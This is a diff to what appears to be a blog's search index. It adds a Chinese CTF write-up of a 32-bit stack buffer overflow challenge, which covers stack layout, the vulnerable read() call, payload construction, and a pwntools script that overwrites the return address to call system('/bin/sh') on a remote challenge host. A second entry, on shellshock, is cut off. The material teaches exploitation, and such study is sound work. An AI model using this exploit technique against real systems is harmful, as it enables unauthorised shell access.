@@ -1,6 +1,15 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[pwn-bof（基础类型题目）]]></title>
+    <url>%2F2019%2F09%2F24%2F2019.09.24%EF%BC%8883%EF%BC%89%2F</url>
+    <content type="text"><![CDATA[一、基础知识1.内存中栈的结构 正如上图所示，栈是由“由高地址向低地址”方向生长。 2.常见的漏洞类型 常见的漏洞类型有如下几种： **① 逻辑错误** **② 内存破坏** &nbsp;&nbsp;&nbsp;&nbsp;✦ 栈溢出 &nbsp;&nbsp;&nbsp;&nbsp;✦ 整数溢出 &nbsp;&nbsp;&nbsp;&nbsp;✦ 格式化字符串 &nbsp;&nbsp;&nbsp;&nbsp;✦ 堆溢出 &nbsp;&nbsp;&nbsp;&nbsp;✦ 释放后使用 二、解题思路1.寻找漏洞 通过 IDA Pro 对文件进行逆向，通过对伪代码的分析，我们可以看到在函数 sub_8048573 中，有一个明显的漏洞——read（）函数。我们是如何知道该处是一个漏洞呢？ 123456789ssize_t sub_8048573()&#123; char buf; // [sp+Ch] [bp-1Ch]@1 sub_804851B(); sub_804854A(); puts("can you pwn me?"); return read(0, &amp;buf, 0x100u);&#125; 通过上面的伪代码，我们可以得出： &nbsp;&nbsp;&nbsp;&nbsp;① 我们可以往 buf 缓存中读入 0x100u 长的数据； &nbsp;&nbsp;&nbsp;&nbsp;② 但是 buf 缓存离 ebp 的偏移只有 0x1c 长； 因为 0x100u &gt; 0x1c ，意味者我们可以往 buf 中输入 256 大小的的数据，但是会产生一处的现象，出现我们输入的数据覆盖掉 ebp 以上的的数据。 2.构造 payload 现在我来画个示意图，来帮助大家理解： 从上图我们可以知道构造 payload 的思路： &nbsp;&nbsp;&nbsp;&nbsp;① 我们之所以要利用这个漏洞，是想要通过覆盖 return address 的内容，从而跳转到我们想要执行的函数上； &nbsp;&nbsp;&nbsp;&nbsp;② 我们首先要填充 buf 和 ebp 部分，也就是 0x1c + 4 = 32 byte &nbsp;&nbsp;&nbsp;&nbsp;③ 我们想要获取 shell ，所以在 return address 那里，我们要让它返回的地址是 system() 函数的地址； &nbsp;&nbsp;&nbsp;&nbsp;④ 因为 pwn 是一个 32 位的 ELF 文件，所以我们还需要填充 4 个字节的数据； &nbsp;&nbsp;&nbsp;&nbsp;⑤ 要想获得 shell ，我们就必须执行 system（‘/bin/sh’） 函数，所以下面我们还得填充 system（） 函数得参数地址； 经过上述的分析，我们可以得到下述的示意图：、 三、解题过程1.构造 payload payload = ‘a’ 32 + p32(system_address) + ‘a’ 4 + p32(bin/sh_address) 2.查找 system 函数和 /bin/sh 的地址 在 IDA 中，可以查到 system 和 /bin/sh 的地址，如下： 3.写 exp123456789101112# -*- coding: utf8 -*-from pwn import *r = remote('vps1.blue-whale.me',9990)system_address = 0x080483F0bin_sh_address = 0x0804A02Cpayload = 'a'*32 + p32(system_address) + 'b'*4 + p32(bin_sh_address)r.send(payload)r.interactive() 4.运行脚本，得到 flag]]></content>
+      <tags>
+        <tag>解题总结</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[bash 漏洞（pwnable-shellshock）]]></title>
     <url>%2F2019%2F09%2F17%2F2019.09.17%EF%BC%8882%EF%BC%89%2F</url>
     <content type="text"><![CDATA[一、前言 pwn 是 CTF 比赛中重要的一种题型，但是对于 pwn 的入门可以这样形容：入门难、精通更难、入神超难，是因为 pwn 中所涉及的题型太多、太深，所以对于没有接触过 pwn 的人来说，刚开始的学习尤为困难，比如像我这种菜鸡。今天我就来介绍一下 pwn 中的涉及 bash 的一种题型吧。 二、基础知识 1.setresuid setresuid() 被执行的条件有： ① 当前进程的 euid 是 root ② 三个参数，每个等于原来某个 id 中的一个]]></content>
